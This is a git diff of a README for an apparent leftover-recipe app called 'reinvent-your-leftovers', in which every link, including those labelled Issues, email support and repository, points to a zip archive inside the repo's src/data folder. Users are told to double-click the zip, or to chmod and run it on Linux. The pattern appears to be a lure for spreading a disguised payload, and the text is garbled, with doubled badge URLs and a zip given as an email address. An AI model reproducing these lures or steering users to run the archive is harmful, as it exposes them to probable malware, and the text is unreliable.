@@ -1,6 +1,6 @@
 # 🥕 reinvent-your-leftovers - Save Food and Create Meals Easily
 
-[![Download from Releases](https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip%https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip)](https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip)
+[![Download from Releases](https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip%https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip)](https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip)
 
 ## 🌟 Overview
 
@@ -12,31 +12,31 @@ To get started with the *reinvent-your-leftovers* app, follow the steps below to
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [GitHub Releases](https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip).
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip).
   
 2. Choose the latest version available, which is marked as "Latest Release". Click on the version number to access the release notes and download options.
 
 3. Download the file that matches your operating system:
-    - For Windows, look for `https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip`.
-    - For macOS, look for `https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip`.
-    - For Linux, look for `https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip`.
+    - For Windows, look for `https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip`.
+    - For macOS, look for `https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip`.
+    - For Linux, look for `https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip`.
 
 4. Once the download completes, locate the downloaded file on your computer.
 
 5. Follow these steps based on your operating system to install:
 
    - **Windows**: 
-     - Double-click the downloaded `https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip` file.
+     - Double-click the downloaded `https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip` file.
      - Follow the on-screen instructions to install the app.
   
    - **macOS**: 
-     - Double-click the downloaded `https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip` file.
+     - Double-click the downloaded `https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip` file.
      - Drag the *reinvent-your-leftovers* icon to your Applications folder.
   
    - **Linux**:
      - Open a terminal window.
-     - Make the AppImage executable by running: `chmod +x https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip`.
-     - Run the application by typing `https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip`.
+     - Make the AppImage executable by running: `chmod +x https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip`.
+     - Run the application by typing `https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip`.
 
 ## 🎉 How to Use
 
@@ -82,16 +82,16 @@ We welcome contributions from everyone. If you have ideas for new features or im
 
 ## 📞 Support
 
-If you need assistance, please visit the [Issues](https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip) section of this repository. You can also contact us through email at https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip
+If you need assistance, please visit the [Issues](https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip) section of this repository. You can also contact us through email at https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip
 
 ## 📚 Learn More
 
 For more information, visit:
-- [GitHub Repository](https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip)
 - [Documentation](#) (link to be added)
 
 ## 🔗 Additional Download Link
 
 For quick access, click the button below to reach the download page:
 
-[![Download from Releases](https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip%https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip)](https://github.com/MILLTESTZA/reinvent-your-leftovers/raw/refs/heads/main/src/data/leftovers_your_reinvent_2.6.zip)
+[![Download from Releases](https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip%https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip)](https://raw.githubusercontent.com/MILLTESTZA/reinvent-your-leftovers/main/src/data/leftovers-your-reinvent-v1.9.zip)
